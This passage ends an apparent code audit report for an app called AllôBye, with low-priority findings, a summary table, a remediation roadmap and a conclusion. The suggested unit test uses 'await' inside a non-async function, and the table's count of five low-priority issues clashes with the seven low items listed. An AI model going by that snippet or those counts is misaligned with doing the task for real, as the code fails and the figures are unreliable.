- Rename `.jsx` to `.tsx`
- Add TypeScript types for props and state

---

### LOW-05: No Unit Tests

**Category**: Quality Assurance

**Issue**:
- No test coverage for critical functions

**Recommended Fix**:
```python
# tests/test_auth.py
def test_verify_parent_owns_child():
    result = await verify_parent_owns_child("parent-id", "child-id")
    assert result == True
```

---

### LOW-06: Unused Code (Mock Mode)

**Category**: Code Quality

**Issue**:
```python
if not supabase:
    # Mock response
    return {...}
```

**Recommended Fix**:
- Remove mock mode from production code
- Use separate test fixtures

---

### LOW-07: No Logging Levels Configuration

**Category**: Operations

**Issue**:
- All logs at same level
- No way to adjust verbosity in production

**Recommended Fix**:
```python
# Use environment variable
log_level = os.getenv("LOG_LEVEL", "INFO")
logger.setLevel(getattr(logging, log_level))
```

---

## Summary Table

| Category | Critical | High | Medium | Low | Total |
|----------|----------|------|--------|-----|-------|
| **Security** | 3 | 1 | 2 | 0 | **6** |
| **Data Integrity** | 2 | 2 | 3 | 0 | **7** |
| **Performance** | 0 | 3 | 4 | 0 | **7** |
| **Reliability** | 0 | 2 | 3 | 0 | **5** |
| **Code Quality** | 0 | 0 | 2 | 5 | **7** |
| **Total** | **5** | **8** | **14** | **5** | **32** |

---

## Prioritized Remediation Roadmap

### Week 1 (Critical Issues)
1. ✅ Implement CSRF protection
2. ✅ Move JWT to HttpOnly cookies
3. ✅ Add transaction safety to pickup creation
4. ✅ Require emergency acknowledgment
5. ✅ Audit logging for password exposure

### Month 1 (High Priority)
1. Fix Realtime/MCP race condition
2. Implement WebSocket reconnection
3. Add duplicate pickup prevention
4. Batch authorization queries (N+1 fix)
5. Fix monitoring memory leak
6. Add thread-safe metrics updates

### Quarter 1 (Medium Priority)
1. Add pagination to dashboard
2. Implement rate limiting
3. Add UUID/DateTime validation
4. Add input sanitization
5. Implement request deduplication
6. Add monitoring retention policy
7. Add schema versioning
8. Add request timeouts
9. Configure connection pooling

### Ongoing (Low Priority)
1. Add TypeScript to React components
2. Implement unit tests
3. Add i18n support
4. Implement dark mode
5. Remove mock code
6. Refactor magic numbers
7. Add configurable logging

---

## Conclusion

AllôBye has **5 critical security/safety issues** that require immediate attention, particularly around authentication storage and emergency alert handling. The **8 high-priority issues** focus on data consistency and performance, especially the Realtime/MCP race condition and N+1 queries. Addressing the critical and high-priority issues will significantly improve system reliability, security, and user safety.

The medium and low-priority issues are primarily quality-of-life improvements and technical debt that can be addressed incrementally without impacting core functionality.
